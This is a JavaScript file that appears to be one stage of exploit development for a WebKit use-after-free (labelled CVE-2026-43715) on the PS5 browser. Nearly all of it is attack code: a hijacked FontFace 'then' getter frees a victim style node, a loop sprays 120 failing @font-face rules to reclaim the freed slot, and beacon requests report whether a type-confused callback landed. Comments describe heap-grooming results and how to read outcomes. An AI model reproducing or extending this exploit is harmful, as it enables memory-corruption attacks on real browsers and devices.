// p451 — CVE-2026-43715 Stage 2: error-status spray + flip fingerprint
// Beacon prefix: V451-
//
// p450: 4/4 rounds survive every run (fully stable groom), but the
// fingerprint baseline failed — PS5 WebKit eager-loads local() faces
// regardless of unicode-range, so no face ever sits at "unloaded".
//
// p451 uses a baseline that DOES exist on device: faces whose src fails.
// local(Songti) rejects with NetworkError -> FontFace.status = "error"
// permanently. The @font-face machinery still allocates (rule parse +
// family lookup), so the spray should still reclaim the freed slot.
//
// Two outcomes, both informative:
//   - survive + no flip  -> error faces reclaim the hole, callback is
//     either landing elsewhere or leaves no trace
//   - survive + flip     -> the type-confused fontLoaded() landed on a
//     sprayed face and flipped it error->loaded: we can SEE the call
//   - death              -> error faces don't allocate the reclaiming
//     class; the working local(Helvetica) spray was what protected us

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V451-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var OK = 'local(Helvetica)';   // the only src that loads on device
  var BAD = 'local(Songti)';     // NetworkError -> status "error"
  var hits = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        // Tight spray, p450 recipe, but every face FAILS to load.
        for (var k = 0; k < 120; k++) {
          var fam = 't' + hits + 'x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam +
            '; src: ' + BAD + '; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          document.body.offsetHeight;    // immediate allocation
        }
        var nf = 0;
        document.fonts.forEach(function() { nf++; });
        B('SPRAY-' + hits + '-F' + nf);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  // Census: counts by status; any t face that is NOT "error" is odd.
  function statCensus(tag) {
    var c = {}, odd = '';
    document.fonts.forEach(function(f) {
      var fam = f.family.replace(/['"]/g, '');
      if (fam[0] === 't' || fam[0] === 'g') {
        var s = f.status;
        c[s] = (c[s] || 0) + 1;
        if (fam[0] === 't' && s !== 'error' && odd.length < 120)
          odd += fam + '=' + s + ' ';
      }
    });
    var parts = [];
    for (var k in c) parts.push(k + ':' + c[k]);
    B(tag + '-STAT[' + parts.join(',') + ']' + (odd ? '-ODD[' + odd + ']' : ''));
  }

  function round(i) {
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() {
        B('SURVIVED-' + i + '-H' + hits);
        statCensus('R' + i);
      },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  var i = 0;
  (function step() {
    if (i >= 4) { B('ALLDONE-H' + hits); statCensus('FINAL'); return; }
    round(i); i++;
    setTimeout(step, 500);
  })();

  setTimeout(function() { B('ALIVE-5S-H' + hits); statCensus('T5'); }, 5000);
})();
